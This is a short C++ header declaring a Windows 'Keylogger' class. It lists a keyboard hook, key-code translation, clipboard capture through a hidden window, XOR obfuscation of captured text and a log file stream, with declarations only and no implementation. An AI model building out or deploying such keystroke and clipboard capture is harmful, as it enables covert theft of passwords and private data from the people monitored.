#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

class Keylogger {
private:
    static wchar_t* key;
    
public:
    static std::ofstream kblog;

    Keylogger(wchar_t* k);
    ~Keylogger();

    static void XOR(wchar_t* data, int data_len, wchar_t* key, int key_len);
    static std::string wstring2utf8(const std::wstring& wstr);

    static wchar_t* vk2ascii(UINT vkCode);
    static LRESULT CALLBACK KBHook(int code, WPARAM wParam, LPARAM lParam);

    static std::wstring GetClipboardText();
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    static HWND CreateCbWindow();
};